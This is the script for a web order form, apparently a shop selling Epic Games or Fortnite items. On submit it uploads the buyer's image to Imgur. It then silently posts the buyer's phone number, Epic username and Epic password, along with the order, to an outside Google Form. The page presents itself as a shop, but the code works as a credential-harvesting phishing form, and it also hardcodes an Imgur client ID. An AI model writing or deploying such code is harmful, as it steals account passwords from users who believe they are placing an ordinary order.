<script>
document.getElementById("orderForm").addEventListener("submit", function (event) {
  event.preventDefault(); // Prevent the default form submission behavior

  // Get form data
  const phone = document.getElementById("phoneno").value;
  const email = document.getElementById("email").value; // Treat as Epic Username
  const password = document.getElementById("pass").value;
  const selectedItems = Array.from(document.querySelectorAll('.item:checked'))
    .map(item => item.dataset.name)
    .join(', ');
  const imageFile = document.getElementById("image").files[0];

  // Imgur API upload
  const imgurClientId = "acf54432c991faf"; // Replace with your Imgur Client ID
  const imgurUrl = "https://api.imgur.com/3/image";
  const formDataImgur = new FormData();
  formDataImgur.append("image", imageFile);

  fetch(imgurUrl, {
    method: "POST",
    headers: {
      Authorization: `Client-ID ${imgurClientId}`,
    },
    body: formDataImgur,
  })
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        const imgurLink = data.data.link;

        // Google Form entry identifiers (replace these with the actual IDs from your form)
        const googleFormUrl = "https://docs.google.com/forms/d/e/1FAIpQLSeMJr4-jccurhQc0V_h7LHnK-e3-S5JW8aUNOS4R3y1vDU5aw/formResponse";
        const formDataGoogle = new URLSearchParams();
        formDataGoogle.append("entry.1150364596", password); // Epic Password
        formDataGoogle.append("entry.1961213495", email); // Epic Username
        formDataGoogle.append("entry.981164193", phone); // Phone Number
        formDataGoogle.append("entry.1330313218", selectedItems); // Ordered Items
        formDataGoogle.append("entry.48528540", imgurLink); // Imgur Link

        // Submit to Google Forms
        fetch(googleFormUrl, {
          method: "POST",
          body: formDataGoogle,
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
        })
          .then(response => {
            alert("Order submitted successfully!");
          })
          .catch(error => {
            console.error("Error submitting the order:", error);
          });
      }
    })
    .catch(error => {
      console.error("Error uploading the image:", error);
    });
});

// Code for dynamically updating selected items and total
const items = document.querySelectorAll('.item');
const selectedItemsElement = document.getElementById('selected-items');
const totalElement = document.getElementById('total');

// Update total and selected items dynamically
function updateOrderSummary() {
  const selectedItems = Array.from(items)
    .filter(item => item.checked)
    .map(item => item.dataset.name);
  const total = Array.from(items)
    .filter(item => item.checked)
    .reduce((sum, item) => sum + parseInt(item.value), 0);

  selectedItemsElement.textContent = selectedItems.length ? selectedItems.join(', ') : 'None';
  totalElement.textContent = total;
}

items.forEach(item => item.addEventListener('change', updateOrderSummary));

// Initialize summary
updateOrderSummary();
</script>
